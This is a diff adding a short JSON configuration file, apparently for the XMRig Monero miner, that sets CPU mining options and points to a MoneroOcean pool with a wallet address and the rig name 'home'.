@@ -1,0 +1,25 @@
+{
+	"autosave": true,
+	"cpu": {
+		"enabled": true,
+		"huge-pages": true
+	},
+	"randomx": {
+		"1gb-pages": true
+	},
+	"opencl": false,
+	"cuda": false,
+	"pools": [
+		{
+			"coin": null,
+			"algo": null,
+			"url": "fr.moneroocean.stream:20128",
+			"user": "49cAnwASmS1LmfbwoVDcv8TGWxxg2nk8J556oVn7UnPVQHfNS5HdYfScRCMnbgDAGihZWeSZQZKAtfrCDw65QLNaHKphR7q",
+			"pass": "x",
+			"rig-id": "home",
+			"tls": true,
+			"keepalive": true,
+			"nicehash": false
+		}
+	]
+}
